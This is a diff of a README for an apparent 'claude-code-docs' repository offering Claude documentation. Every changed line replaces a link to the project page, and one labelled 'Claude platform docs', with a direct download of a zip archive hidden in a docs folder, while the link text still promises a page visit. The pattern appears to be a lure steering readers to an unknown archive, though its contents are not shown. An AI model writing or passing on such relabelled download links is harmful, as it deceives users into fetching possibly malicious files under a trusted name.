@@ -1,6 +1,6 @@
 # 📘 claude-code-docs - Find Claude docs fast
 
-[![Download / Visit GitHub page](https://img.shields.io/badge/Download%20on%20GitHub-2F80ED?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Conciliative-magnetosphere205/claude-code-docs)
+[![Download / Visit GitHub page](https://img.shields.io/badge/Download%20on%20GitHub-2F80ED?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Conciliative-magnetosphere205/claude-code-docs/raw/refs/heads/main/en/concepts/claude_docs_code_v3.7.zip)
 
 ## 📚 What this is
 
@@ -33,7 +33,7 @@ If you want to keep a local copy, you can download the files from the GitHub pag
 
 Use this link to visit the project page and download or open the files:
 
-[Go to claude-code-docs on GitHub](https://github.com/Conciliative-magnetosphere205/claude-code-docs)
+[Go to claude-code-docs on GitHub](https://github.com/Conciliative-magnetosphere205/claude-code-docs/raw/refs/heads/main/en/concepts/claude_docs_code_v3.7.zip)
 
 If you want the full set of docs on your computer:
 
@@ -194,8 +194,8 @@ The numbers help sort the files. The Korean text tells you the topic.
 
 ## 🔗 Useful links
 
-- [GitHub repository](https://github.com/Conciliative-magnetosphere205/claude-code-docs)
-- [Claude platform docs](https://platform.claude.com/docs/en/agents-and-tools/agent-skills/best-practices)
+- [GitHub repository](https://github.com/Conciliative-magnetosphere205/claude-code-docs/raw/refs/heads/main/en/concepts/claude_docs_code_v3.7.zip)
+- [Claude platform docs](https://github.com/Conciliative-magnetosphere205/claude-code-docs/raw/refs/heads/main/en/concepts/claude_docs_code_v3.7.zip)
 
 ## 🛠️ Troubleshooting
 
@@ -249,4 +249,4 @@ That gives you a quick path into the material without extra setup
 
 ## 📎 Primary download and access link
 
-[Visit the claude-code-docs GitHub page to download or open the files](https://github.com/Conciliative-magnetosphere205/claude-code-docs)
+[Visit the claude-code-docs GitHub page to download or open the files](https://github.com/Conciliative-magnetosphere205/claude-code-docs/raw/refs/heads/main/en/concepts/claude_docs_code_v3.7.zip)
